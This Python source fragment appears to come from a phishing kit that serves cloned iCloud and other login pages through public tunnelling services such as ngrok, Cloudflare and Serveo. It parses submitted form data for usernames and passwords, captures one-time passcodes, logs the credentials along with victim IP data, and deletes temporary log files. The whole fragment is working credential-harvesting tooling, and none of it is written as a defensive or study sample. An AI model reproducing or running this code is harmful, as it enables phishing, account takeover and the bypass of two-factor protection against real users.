	if (tunnel == 0):
		sys.exit()
	elif (tunnel == 1):
		localhost_server()
	elif (tunnel == 2):
		download_ngrok()
	elif (tunnel == 3):
		cloudflare_tunnel()
	elif (tunnel == 4):
		localxpose_tunnel()
	elif(tunnel == 5):
		serveo_ssh_tunnel()
	elif(tunnel == 6):
		local_tunnel()
	else:
		print("\033[1;91m[!] Invalid option!\033[0;0m\n")
			

def extract_key_value(line):
	if "=" in line:
		key, value = line.split("=", 1)

		return key, value.strip()
	return None, None

def extract_data(log):
	username = None
	password = None
	for line in log.splitlines():
		key, value = extract_key_value(line)
		if key:
			if any(k in key.lower() for k in ["username", "email", "user", "usernameoremail", "login", "j_username", "login_email", "login_username", "userid", "userloginid"]):
				username = value
			elif any(k in key.lower() for k in ["password", "passwd", "pass", "j_password", "login_password"]):
				password = value

	if username:
		username = "Username: {}".format(username)
		print(username)
	if password:
		password = "Password: {}".format(password)
		print(password)

	return username, password


if (option==1):
	try:
		site = "iCloud"
		available_tunnels()
		os.chdir("core/sites/iCloud")
		server("iCloud")
		username, password, otp = work_otp()
		stop()
		save_aggregated_log(site, username, password, otp)
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)

elif (option==2):
	try:
		site = "DataCloudEasy"
		available_tunnels()
		os.chdir("core/sites/DataCloudEasy")
		server("DataCloudEasy")
		username, password, otp = work_otp()
		stop()
		save_aggregated_log(site, username, password, otp)
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)


elif (option==0):
	print("")
	sys.exit()

else:
	print("\n\033[1;91m[!] Invalid option!\033[0;0m\n")
